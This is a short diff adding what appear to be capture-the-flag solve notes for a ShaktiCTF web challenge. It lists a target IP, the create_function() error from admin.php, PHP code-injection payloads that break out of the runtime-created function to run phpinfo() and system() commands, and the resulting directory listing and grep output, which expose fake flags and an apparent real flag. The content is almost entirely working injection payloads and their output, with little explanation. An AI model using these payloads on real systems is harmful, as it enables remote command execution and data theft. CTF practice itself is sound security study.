@@ -1,0 +1,21 @@
+http://35.238.173.184/admin.php
+	Deprecated: Function create_function() is deprecated in /var/www/html/admin.php on line 23
+
+	Parse error: syntax error, unexpected '}' in /var/www/html/admin.php(23) : runtime-created function on line 1
+
+
+;}phpinfo();/*
+OR
+}phpinfo();{
+
+}system("ls");{
+	1 12345642312 1998_Dumb_secrets.php 2 Dockerfile a aaa aaaa admin.php asd c chat.html check.html css flag.html flag.php flag.txt fonts haclabor.txt index.html login.html lol.txt myfile2.txt report.html rules.html s.php t test.php testfile.txt zaabi_ta7an.php
+
+}system("grep -nr 'shakti*'");{
+	flag.html:2:$flag="shaktictf{fake_flag}";
+	a:2:$flag="shaktictf{fake_flag}";
+	flag.txt:2:$flag="shaktictf{fake_flag}";
+	c:2:$flag="shaktictf{fake_flag}";
+	flag.php:2:$flag="shaktictf{fake_flag}";
+	myfile2.txt:2:$flag="shaktictf{fake_flag}";
+	1998_Dumb_secrets.php:2:$flag1="shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}";
